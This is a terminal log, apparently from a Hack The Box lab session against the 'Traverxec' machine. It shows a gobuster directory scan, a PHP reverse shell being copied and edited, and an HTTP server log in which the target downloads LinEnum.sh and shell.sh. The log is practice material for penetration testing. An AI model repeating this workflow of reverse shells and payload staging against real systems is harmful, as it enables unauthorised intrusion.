@@ -1,0 +1,54 @@
+root@parrot:~/hackthebox/traverxec# gobuster dir -u http://10.10.10.165 -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php                 
+===============================================================                  
+Gobuster v3.0.1                         
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                  
+===============================================================                  
+[+] Url:            http://10.10.10.165 
+[+] Threads:        10                  
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+[+] Status codes:   200,204,301,302,307,401,403                                  
+[+] User Agent:     gobuster/3.0.1      
+[+] Extensions:     php                 
+[+] Add Slash:      true                
+[+] Timeout:        10s                 
+===============================================================                  
+2020/01/13 09:53:52 Starting gobuster   
+===============================================================                  
+/img/ (Status: 200)                     
+/icons/ (Status: 200)                   
+/css/ (Status: 200)                     
+/lib/ (Status: 200)                     
+/js/ (Status: 200)                      
+[ERROR] 2020/01/13 10:04:29 [!] Get http://10.10.10.165/sourceroute/: net/http: request canceled (Client.Timeout exceeded while awaiting headers)                 
+[ERROR] 2020/01/13 10:04:30 [!] Get http://10.10.10.165/1334/: net/http: request canceled (Client.Timeout exceeded while awaiting headers)                        
+Progress: 7724 / 220561 (3.50%)^C       
+[!] Keyboard interrupt detected, terminating.                                    
+===============================================================                  
+2020/01/13 10:06:39 Finished            
+===============================================================                  
+root@parrot:~/hackthebox/traverxec# cp /opt/php-reverse-shell/php-reverse-shell.php reverse.php                                                                   
+root@parrot:~/hackthebox/traverxec# ls  
+exploit.py  nmap  reverse.php           
+root@parrot:~/hackthebox/traverxec# vi reverse.php                               
+root@parrot:~/hackthebox/traverxec# python -m SimpleHTTPServer                   
+Serving HTTP on 0.0.0.0 port 8000 ...   
+10.10.10.165 - - [13/Jan/2020 21:28:08] "GET /LinEnum.sh HTTP/1.1" 200 -         
+10.10.10.165 - - [13/Jan/2020 21:36:55] "GET /LinEnum.sh HTTP/1.1" 200 -         
+10.10.10.165 - - [13/Jan/2020 21:39:32] "GET /shell.sh HTTP/1.1" 200 -           
+^CTraceback (most recent call last):    
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main           
+    "__main__", fname, loader, pkg_name)                                         
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code                      
+    exec code in run_globals            
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>           
+    test()                              
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test               
+    BaseHTTPServer.test(HandlerClass, ServerClass)                               
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test                 
+    httpd.serve_forever()               
+  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever          
+    poll_interval)                      
+  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry           
+    return func(*args)                  
+KeyboardInterrupt                       
+root@parrot:~/hackthebox/traverxec#     
